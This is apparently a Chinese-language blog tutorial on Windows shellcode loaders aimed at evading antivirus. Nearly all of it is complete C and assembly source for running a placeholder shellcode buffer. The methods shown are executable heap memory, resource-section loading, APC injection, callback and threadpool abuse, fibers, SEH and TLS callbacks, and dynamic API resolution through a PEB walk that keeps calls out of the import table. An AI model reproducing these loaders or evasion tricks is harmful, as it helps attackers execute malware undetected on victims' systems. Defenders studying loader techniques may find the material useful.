<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)  </span><br><span class="line">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">	HANDLE heap &#x3D; HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(buf), 0);</span><br><span class="line">	LPVOID buffer &#x3D; HeapAlloc(heap, HEAP_ZERO_MEMORY,sizeof(buf));</span><br><span class="line">	RtlMoveMemory(buffer,buf,sizeof(buf));</span><br><span class="line">	HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	HeapFree(heap, 0, buffer);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="资源节加载"><a href="#资源节加载" class="headerlink" title="资源节加载"></a>资源节加载</h2><p>资源文件通常存放在 <code>.rsrc</code> 节（Resource Section）中。<code>.rsrc</code> 节是 PE（Portable Executable）文件格式中的一个节（section），用于存储程序的资源信息，如图标、对话框、字符串、位图等。每个资源项都有一个唯一的标识符（ID），程序可以通过这个标识符来获取特定的资源。</p>
<p>vs中 <strong>添加资源，导入bin文件，自定义资源类型</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过资源加载ShellCode</span><br><span class="line">void ResourceLoader() &#123;</span><br><span class="line">	&#x2F;&#x2F;获取资源</span><br><span class="line">    HRSRC Res &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE1), L&quot;shellcode&quot;);</span><br><span class="line">    &#x2F;&#x2F;用于获取资源的大小</span><br><span class="line">    DWORD ResSize &#x3D; SizeofResource(NULL, Res);</span><br><span class="line">    &#x2F;&#x2F;LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span><br><span class="line">    HGLOBAL Load &#x3D; LoadResource(NULL, Res);</span><br><span class="line">    &#x2F;&#x2F;申请内存</span><br><span class="line">    void* buffer &#x3D; VirtualAlloc(NULL, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(buffer, Load, ResSize);</span><br><span class="line">    &#x2F;&#x2F;执行shellcode</span><br><span class="line">    ((void(*)(void)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    ResourceLoader();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h2><p>异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I/O 操作。</p>
<p>触发流程：</p>
<ul>
<li>使用 <code>VirtualProtect</code> 函数修改 <code>shellcode</code> 所在内存区域的保护属性，将其设置为可执行、可读、可写</li>
<li>获取 <code>NtTestAlert</code> 函数的地址。(这是一个内部函数，无法直接通过函数名调用，<code>NtTestAlert</code> 函数用于检查当前线程的 APC 队列，如果队列中有挂起的用户模式 APC 请求，<code>NtTestAlert</code> 将触发它们的执行)</li>
<li>使用 <code>QueueUserAPC</code> 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务</li>
<li>调用 <code>NtTestAlert</code> 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef DWORD(WINAPI* pNtTestAlert)();</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 修改 shellcode 所在内存区域的保护属性，允许执行</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span><br><span class="line">    pNtTestAlert NtTestAlert &#x3D; (pNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 将buf强转为APC 函数,向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span><br><span class="line">    QueueUserAPC((PAPCFUNC)buf, GetCurrentThread(), NULL);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span><br><span class="line">    NtTestAlert();</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="基于回调函数"><a href="#基于回调函数" class="headerlink" title="基于回调函数"></a>基于回调函数</h2><p>通过 <strong>各种回调函数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EnumTimeFormatsA</span><br><span class="line">EnumWindows</span><br><span class="line">EnumDesktopWindows</span><br><span class="line">EnumDateFormatsA</span><br><span class="line">EnumChildWindows</span><br><span class="line">EnumThreadWindows</span><br><span class="line">EnumSystemLocalesA</span><br><span class="line">EnumSystemGeoID</span><br><span class="line">EnumSystemLanguageGroupsA</span><br><span class="line">EnumUILanguagesA</span><br><span class="line">EnumSystemCodePagesA</span><br><span class="line">EnumDesktopsW</span><br><span class="line">EnumSystemCodePagesW</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>EnumFontsW</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 开辟空间</span><br><span class="line">	void *shellcode &#x3D; VirtualAlloc(NULL,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	&#x2F;&#x2F; copy shellcode</span><br><span class="line">	RtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class="line">	&#x2F;&#x2F; 触发回调函数</span><br><span class="line">	EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)shellcode, NULL);</span><br><span class="line">	EnumUILanguages((UILANGUAGE_ENUMPROCW)shellcode, 0, NULL);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="线程池等待"><a href="#线程池等待" class="headerlink" title="线程池等待"></a>线程池等待</h2><p>类似于回调函数，只不过是在线程池的应用中的几个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void* shellcode &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    RtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class="line">    &#x2F;*</span><br><span class="line">    * CreateEvent是Windows API，用于创建一个事件对象</span><br><span class="line">    * 参数1：安全属性，NULL表示默认</span><br><span class="line">    * 参数2：是否手动复位</span><br><span class="line">    * 参数3：TRUE表示事件对象的初始状态为有信号状态，否则为无信号状态</span><br><span class="line">    * 参数4：事件名称，NULL表示不使用名称</span><br><span class="line">    *&#x2F;</span><br><span class="line">    HANDLE event &#x3D; CreateEvent(NULL, FALSE, TRUE, NULL);</span><br><span class="line">    &#x2F;*</span><br><span class="line">    * CreateThreadpoolWait是Windows API，用于创建一个线程池等待对象</span><br><span class="line">    * 参数1：回调函数指针</span><br><span class="line">    * 参数2：回调函数参数</span><br><span class="line">    * 参数3：线程池回调环境</span><br><span class="line">    *&#x2F;</span><br><span class="line">    PTP_WAIT threadPoolWait &#x3D; CreateThreadpoolWait((PTP_WAIT_CALLBACK)(LPVOID)shellcode, NULL, NULL);</span><br><span class="line">    &#x2F;*</span><br><span class="line">    * SetThreadpoolWait是Windows API，用于向线程池中添加等待对象</span><br><span class="line">    * 参数1：线程池等待对象</span><br><span class="line">    * 参数2：要等待的内核对象句柄</span><br><span class="line">    * 参数3：等待超时时间，NULL表示无限等待</span><br><span class="line">    *&#x2F;</span><br><span class="line">    SetThreadpoolWait(threadPoolWait, event, NULL);</span><br><span class="line">    WaitForSingleObject(event, INFINITE); &#x2F;&#x2F; 等待事件对象执行完毕(状态变为无信号)，事件对象执行会执行回调函数buf</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="纤程加载"><a href="#纤程加载" class="headerlink" title="纤程加载"></a>纤程加载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 将当前线程转换为纤程（轻量级线程）</span><br><span class="line">    ConvertThreadToFiber(NULL);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span><br><span class="line">    void* shellcodeFiber &#x3D; CreateFiber(0, (LPFIBER_START_ROUTINE)(LPVOID)buf, NULL);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 切换到新创建的纤程，开始执行shellcode</span><br><span class="line">    SwitchToFiber(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; shellcode执行完毕后，删除纤程对象</span><br><span class="line">    DeleteFiber(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="基于SEH异常处理"><a href="#基于SEH异常处理" class="headerlink" title="基于SEH异常处理"></a>基于SEH异常处理</h2><p>SEH（Structured Exception Handling，结构化异常处理）是 Windows 平台提供的一种异常处理机制，它允许程序员编写结构化的代码来处理异常情况。SEH 提供了一种在程序中捕获、处理和传播异常的方法，可以有效地处理诸如访问违例、除以零、内存访问错误等异常情况。</p>
<p>SEH 提供了以下关键元素来实现异常处理：</p>
<ol>
<li>__try 块：用于包裹可能会引发异常的代码块。</li>
<li>__except 块：用于捕获和处理异常的代码块。</li>
<li>__finally 块（可选）：用于执行清理操作的代码块，在异常处理完毕后无论是否发生异常都会执行。</li>
<li>__leave 语句（可选）：用于退出包裹在 __try 块中的代码。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)</span><br><span class="line">&#x2F;&#x2F;#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;Windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)   &#x2F;&#x2F;不显示窗口 </span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line">int a &#x3D; 1;</span><br><span class="line">int b &#x3D; 0;</span><br><span class="line"></span><br><span class="line">int exceptFilter()</span><br><span class="line">&#123;</span><br><span class="line">	b &#x3D; 1; &#x2F;&#x2F; 修改b的值为1，以防止无限循环的异常处理</span><br><span class="line">	((void(*)(void)) &amp; buf)();</span><br><span class="line">	return EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">	&#x2F;*</span><br><span class="line">        异常处理函数的返回值除了有EXCEPTION_CONTINUE_EXECUTION,还有以下两个值:</span><br><span class="line">        EXCEPTION_EXECUTE_HANDLER:常处理器已处理异常，程序应在_except块内继续执行</span><br><span class="line">        EXCEPTION_CONTINUE_SEARCH:常处理器未处理异常，程序应继续搜索其他异常处理器</span><br><span class="line">	*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	__try &#123;</span><br><span class="line">		int c &#x3D; a &#x2F; b;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (exceptFilter()) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="TLS机制"><a href="#TLS机制" class="headerlink" title="TLS机制"></a>TLS机制</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12057?time__1311=mqmhBKD50I=h7DlxGo/tNbMCFD8tYzeD&alichlgref=https://cn.bing.com/">TLS回调函数的学习</a>、<a target="_blank" rel="noopener" href="https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute">TLS Code Execute</a></p>
<p>线程局部存储（TLS），是一种变量的存储方法，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性。在启用了TLS功能的PE文件中，会设置有关于TLS的TLS Table（TLS表），这个表的位置信息可以在IMAGE_DATA_DIRECTORY DataDirectory[9]中找到。</p>
<p> TLS的数据结构体如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32位</span><br><span class="line">typedef struct _IMAGE_TLS_DIRECTORY32 &#123;</span><br><span class="line">    DWORD   StartAddressOfRawData;</span><br><span class="line">    DWORD   EndAddressOfRawData;</span><br><span class="line">    DWORD   AddressOfIndex;             &#x2F;&#x2F; PDWORD</span><br><span class="line">    DWORD   AddressOfCallBacks;         &#x2F;&#x2F; PIMAGE_TLS_CALLBACK *</span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        struct &#123;</span><br><span class="line">            DWORD Reserved0 : 20;</span><br><span class="line">            DWORD Alignment : 4;</span><br><span class="line">            DWORD Reserved1 : 8;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">64位</span><br><span class="line">typedef struct _IMAGE_TLS_DIRECTORY64 &#123;</span><br><span class="line">    ULONGLONG StartAddressOfRawData;</span><br><span class="line">    ULONGLONG EndAddressOfRawData;</span><br><span class="line">    ULONGLONG AddressOfIndex;         &#x2F;&#x2F; PDWORD</span><br><span class="line">    ULONGLONG AddressOfCallBacks;     &#x2F;&#x2F; PIMAGE_TLS_CALLBACK *;</span><br><span class="line">    DWORD SizeOfZeroFill;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        struct &#123;</span><br><span class="line">            DWORD Reserved0 : 20;</span><br><span class="line">            DWORD Alignment : 4;</span><br><span class="line">            DWORD Reserved1 : 8;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY64;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>AddressOfCallBacks</strong> 这个成员是一个指向函数地址数组的指针，这里的函数的地址就是 <strong>TLS回调函数</strong> 的实际地址</p>
<p>TLS回调函数：</p>
<p>每当创建/终止线程时会自动调用执行的函数（<strong>创建进程的主线程时也会自动调用回调函数，且回调函数的执行顺序是 先于EP代码 的执行，即先于main函数，所以TLS回调函数的这个特性通常被用于反调试技术</strong>）由于是创建和终止线程时都会调用，所以在程序从打开到结束这个TLS回调函数会被执行两次。</p>
<p>TLS函数模板如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)</span><br><span class="line">(</span><br><span class="line">    PVOID DllHandle,</span><br><span class="line">    DWORD Reason,</span><br><span class="line">    PVOID Reserved</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>32位与64位声明不同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;TLS回调函数</span><br><span class="line">VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class="line">&#123;</span><br><span class="line">	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		void* shellcode &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		RtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class="line">		((void(*)()) shellcode)();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用</span><br><span class="line">#ifdef _WIN64       &#x2F;&#x2F;64位</span><br><span class="line">#pragma comment (linker, &quot;&#x2F;INCLUDE:_tls_used&quot;)  </span><br><span class="line">#pragma comment (linker, &quot;&#x2F;INCLUDE:tls_callback_func&quot;) </span><br><span class="line">#else               &#x2F;&#x2F;32位</span><br><span class="line">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_used&quot;) </span><br><span class="line">#pragma comment (linker, &quot;&#x2F;INCLUDE:_tls_callback_func&quot;)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;注册TLS回调函数</span><br><span class="line">#ifdef _WIN64</span><br><span class="line">#pragma const_seg(&quot;.CRT$XLF&quot;) &#x2F;&#x2F;64位</span><br><span class="line">EXTERN_C const</span><br><span class="line">#else</span><br><span class="line">#pragma data_seg(&quot;.CRT$XLF&quot;) &#x2F;&#x2F;32位</span><br><span class="line">EXTERN_C</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">PIMAGE_TLS_CALLBACK tls_callback_func[] &#x3D; &#123; TlsCallBack,0 &#125;;</span><br><span class="line"></span><br><span class="line">#ifdef _WIN64    </span><br><span class="line">#pragma const_seg() &#x2F;&#x2F;64位</span><br><span class="line">#else</span><br><span class="line">#pragma data_seg() &#x2F;&#x2F;32位</span><br><span class="line">#endif </span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;After TLS&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tips：TLS的特性可以加入反调试：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/helloylh/p/17209669.html">TLS及反调试机制</a></p>
<h2 id="动态API加载"><a href="#动态API加载" class="headerlink" title="动态API加载"></a>动态API加载</h2><p>一些敏感API函数或敏感API函数组合会被监控，同时在PE导入表也会列出敏感函数，通过动态加载：<strong>调用函数在PE导入表中不可见</strong></p>
<p>主要通过两个函数实现：<strong>GetProcAddress</strong> 和 <strong>LoadLibraryA</strong></p>
<p><strong>一些前置：</strong></p>
<p>在RING3下 <strong>FS寄存器</strong> 指向 <strong>TEB(线程结构体)</strong> ，在TEB+0x30处就是 <strong>PEB进程结构体</strong>，PEB+0xC的位置就是 <strong>_PEB_LDR_DATA结构体</strong>，里面包含了dll加载链，该结构体中的 <strong>InInitializationOrderModuleList</strong> 这个链表 <strong>第二个必定是kernel32.dll</strong></p>
<p><strong>流程思路：</strong></p>
<ul>
<li>定位关键模块：首先找到包含核心API函数的关键模块（如kernel32.dll）。这通常可以通过解析PEB（Process Environment Block）中的模块列表来完成。</li>
<li>获取GetProcAddress：定位到kernel32.dll后，需要解析导出表（Export Table）以获取GetProcAddress函数的地址。GetProcAddress是一个核心函数，用于在运行时动态解析其他API函数的地址。</li>
<li>加载其他API：<strong>通过GetProcAddress函数</strong>，可以逐个获取其他需要的API函数的地址。例如，可以通过GetProcAddress获取VirtualProtect、CreateThread和WaitForSingleObject等函数的地址。</li>
<li>准备Shellcode：将Shellcode存储在缓冲区中，使用VirtualProtect函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行Shellcode。</li>
<li>创建线程并执行Shellcode：使用CreateThread函数创建一个新线程，并将Shellcode的地址作为线程的启动例程。线程创建后，使用WaitForSingleObject等待线程执行完成</li>
</ul>
<p><strong>编写：</strong></p>
<p><strong>x86</strong>，直接利用汇编获取kernel32.dll地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">		push eax</span><br><span class="line">		mov eax, fs:[0x30]</span><br><span class="line">		mov eax, [eax + 0xc]</span><br><span class="line">		mov eax, [eax + 0x1c]</span><br><span class="line">		mov eax, [eax]</span><br><span class="line">		mov eax, [eax + 0x8]</span><br><span class="line">		mov kernel32Address,eax</span><br><span class="line">		pop eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">DWORD GetKernel32Address()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD kernel32Address &#x3D; 0;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		push eax</span><br><span class="line">		mov eax, fs:[0x30]</span><br><span class="line">		mov eax, [eax + 0xc]</span><br><span class="line">		mov eax, [eax + 0x1c]</span><br><span class="line">		mov eax, [eax]</span><br><span class="line">		mov eax, [eax + 0x8]</span><br><span class="line">		mov kernel32Address,eax</span><br><span class="line">		pop eax</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;[+]kernel32 base: 0x%p\n&quot;, kernel32Address);</span><br><span class="line">	return kernel32Address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD RGetProcAddress(DWORD kernelbase)</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 获取Dos头即起始地址</span><br><span class="line">	PIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)kernelbase;</span><br><span class="line">	&#x2F;&#x2F; 获取NT头</span><br><span class="line">	PIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + kernelbase);</span><br><span class="line">	&#x2F;&#x2F; 数据目录</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDir &#x3D; pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;</span><br><span class="line">	&#x2F;&#x2F; 导出表地址</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExport &#x3D; (PIMAGE_EXPORT_DIRECTORY)(pDataDir-&gt;VirtualAddress + kernelbase);</span><br><span class="line">	printf(&quot;[+]Export Addr: 0x%p\n&quot;, pExport);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;函数总数</span><br><span class="line">	DWORD dwFunCount &#x3D; pExport-&gt;NumberOfFunctions;</span><br><span class="line">	&#x2F;&#x2F;函数名称数量</span><br><span class="line">	DWORD dwFunNameCount &#x3D; pExport-&gt;NumberOfNames;</span><br><span class="line">	&#x2F;&#x2F;函数地址</span><br><span class="line">	PDWORD pAddrOfFun &#x3D; (PDWORD)(pExport-&gt;AddressOfFunctions + kernelbase);</span><br><span class="line">	&#x2F;&#x2F;函数名称地址</span><br><span class="line">	PDWORD pAddrOfNames &#x3D; (PDWORD)(pExport-&gt;AddressOfNames + kernelbase);</span><br><span class="line">	&#x2F;&#x2F;序号表</span><br><span class="line">	PWORD pAddrOfOrdinals &#x3D; (PWORD)(pExport-&gt;AddressOfNameOrdinals + kernelbase);</span><br><span class="line">	</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; dwFunCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;判断函数地址是否存在,为空</span><br><span class="line">		if (!pAddrOfFun[i])</span><br><span class="line">		&#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		&#x2F;&#x2F;通过函数地址遍历函数名称地址，获取想要的函数</span><br><span class="line">		DWORD dwFunAddrOffset &#x3D; pAddrOfFun[i];</span><br><span class="line">		for (size_t j &#x3D; 0; j &lt; dwFunNameCount; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			if (pAddrOfOrdinals[j] &#x3D;&#x3D; i)</span><br><span class="line">			&#123;</span><br><span class="line">				DWORD dwNameOffset &#x3D; pAddrOfNames[j];</span><br><span class="line">				char* pFunName &#x3D; (char*)(kernelbase + dwNameOffset);</span><br><span class="line"></span><br><span class="line">				if (strcmp(pFunName, &quot;GetProcAddress&quot;) &#x3D;&#x3D; 0)</span><br><span class="line">				&#123;</span><br><span class="line">					printf(&quot;[+]GetProcAddress Addr: 0x%p\n&quot;, dwFunAddrOffset + kernelbase);</span><br><span class="line">					return dwFunAddrOffset + kernelbase;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 根据原函数结构,声明定义api函数</span><br><span class="line">typedef FARPROC(WINAPI* pGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);</span><br><span class="line">typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);</span><br><span class="line">typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);</span><br><span class="line">typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; kernel32地址</span><br><span class="line">	HMODULE kernelbase &#x3D; (HMODULE)GetKernel32Address();</span><br><span class="line">	&#x2F;&#x2F; GetProcAddress函数地址</span><br><span class="line">	pGetProcAddress MyGetProcAddress &#x3D; (pGetProcAddress)RGetProcAddress(kernelbase);</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F;开始获取各种函数</span><br><span class="line">	pVirtualProtect MyVirtualProtect &#x3D; (pVirtualProtect)MyGetProcAddress(kernelbase, &quot;VirtualProtect&quot;);</span><br><span class="line">	pCreateThread MyCreateThread &#x3D; (pCreateThread)MyGetProcAddress(kernelbase, &quot;CreateThread&quot;);</span><br><span class="line">	pWaitForSingleObject MyWaitForSingleObject &#x3D; (pWaitForSingleObject)MyGetProcAddress(kernelbase, &quot;WaitForSingleObject&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 组合加载shellcode</span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	MyVirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	HANDLE hThread &#x3D; MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);</span><br><span class="line">	MyWaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>x64</strong>，默认无法使用汇编</p>
<p>在项目中右键新建项 <code>GetInitializationOrderModuleList.asm</code> ，用于获取 <code>InitializationOrderModuleList</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h]</span><br><span class="line">    mov rax,[rax+18h]</span><br><span class="line">    mov rax,[rax+30h]</span><br><span class="line">    ret</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>右键单击新建的asm文件, 选择属性, 在常规选项处将 <code>从生成中排除</code> 设置为 <code>否</code>, 项类型设置为 <code>自定义生成工具</code></p>
<p>在自定义生成工具选项处</p>
<p>在命令行框输入 <code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code></p>
<p>在输出框输入 <code>$(IntDir)%(FileName).obj</code></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410162639824.png"></p>
<p>打开项目属性，勾选 <code>C/C++-&gt;代码生成-&gt;禁用安全检查</code></p>
